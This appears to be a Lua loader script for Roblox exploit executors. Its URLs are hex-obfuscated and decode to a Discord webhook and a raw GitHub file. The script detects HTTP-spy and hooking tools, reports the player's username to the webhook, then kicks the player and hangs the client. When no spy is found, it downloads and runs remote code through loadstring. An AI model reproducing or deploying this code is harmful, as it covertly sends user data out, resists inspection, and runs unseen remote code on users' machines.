local function _H(h)
    local s = ""
    for i = 1, #h, 2 do s = s .. string.char(tonumber(h:sub(i, i+1), 16)) end
    return s
end

local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
local _L = game:GetService("Players").LocalPlayer

local function _DETECT()
    if not _req then return false end
    local ok, info = pcall(debug.getinfo, _req)
    if ok and info and (info.source ~= "=[C]" or info.what ~= "C") then return "HOOKED_REQUEST" end
    if debug.getinfo(game.HttpGet).source ~= "=[C]" then return "HOOKED_HTTPGET" end
    local cg = game:GetService("CoreGui")
    for _, n in ipairs({"SimpleSpy", "HttpSpy", "HydroSpy", "VGG Spy", "TwiSpy", "NotDSF"}) do
        if cg:FindFirstChild(n) or getgenv()[n] then return n end
    end
    return false
end

local _se = _DETECT()
if _se then
    local _A = _H("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531383333343033353838383138313237312F733164313841767532456D57707A547254306A4E49686A543665314A3537595837304F58484D567878637975535377364C366E7242416A7756737067612D4C37534E4B4F")
    pcall(function()
        _req({Url = _A, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({
            embeds = {{title = "Security Alert: Advanced Spy Detected", color = 16711680, fields = {{name = "User", value = _L.Name, inline = true}, {name = "Detection", value = tostring(_se), inline = true}}}}
        })})
    end)
    _L:Kick("Security Tamper Detected: 0xFA")
    while true do end return
end

shared._NK_STAGE = "SHIELD_PASSED"
local _INF_URL = _H("68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F697473656173797270672F746573745F687474702F726566732F68656164732F6D61696E2F696E666F726D616E742E6C7561")
loadstring(game:HttpGet(_INF_URL))()
